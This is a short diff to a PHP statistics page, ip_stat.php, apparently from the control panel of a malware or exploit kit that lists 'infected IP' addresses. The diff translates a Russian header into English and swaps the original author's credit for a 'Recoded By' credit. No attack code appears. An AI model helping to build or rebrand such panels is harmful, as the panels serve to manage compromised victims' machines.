@@ -49,7 +49,7 @@ for ( ; $i < $total_columns; ++$i )
 {
     echo "\r\n\t\t<td valign=\"top\" width=\"";
     echo floor( 100 / $total_columns );
-    echo "%\">\r\r\n\t\t\t<table cellpadding=\"0\" cellspacing=\"0\" width=\"200\" border=\"1\" align=\"center\" bordercolor=\"#7AA0B8\" bordercolorlight=\"black\" bordercolordark=\"white\">\r\r\n\t\t\t\t<tr>\r\r\n\t\t\t\t\t<td align=\"center\" class=\"pagetitle\" bgcolor=\"#103056\"><b>Зараженные IP</b></td>\r\r\n\t\t\t\t</tr>\r\r\n\t\t\t\t";
+    echo "%\">\r\r\n\t\t\t<table cellpadding=\"0\" cellspacing=\"0\" width=\"200\" border=\"1\" align=\"center\" bordercolor=\"#7AA0B8\" bordercolorlight=\"black\" bordercolordark=\"white\">\r\r\n\t\t\t\t<tr>\r\r\n\t\t\t\t\t<td align=\"center\" class=\"pagetitle\" bgcolor=\"#103056\"><b>infected IP</b></td>\r\r\n\t\t\t\t</tr>\r\r\n\t\t\t\t";
     $j = $rows_per_column * $i;
     for ( ; $j < $rows_per_column * ( $i + 1 ) && isset( $Stats[$j] ); ++$j )
     {
@@ -63,5 +63,5 @@ echo "\r\n\t</tr>\r\r\n\t<tr>\r\r\n\t\t<td align=\"center\" colspan=\"";
 echo $total_columns;
 echo "\">";
 echo pages( $total_records, $qppp, $startpos, "ip_stat.php" );
-echo "</td>\r\r\n\t</tr>\r\r\n</table>\r\n</td></tr><tr><td align=\"center\" class=\"pagetitle\" bgcolor=\"#000000\"><a href=\"http://xshop.in\"><font color=\"snow\">Created by&nbsp;<b>0x88</b>&nbsp;(ICQ 92777755)</a></font></td></tr></table></body></html>\r\n";
+echo "</td>\r\r\n\t</tr>\r\r\n</table>\r\n</td></tr><tr><td align=\"center\" class=\"pagetitle\" bgcolor=\"#000000\"><a href=\"http://munir.skilledsoft.com\"><font color=\"snow\">Recoded By by&nbsp;<b>Alienwithin</b>&nbsp; || Original Coder's(ICQ 92777755)</a></font></td></tr></table></body></html>\r\n";
 ?>
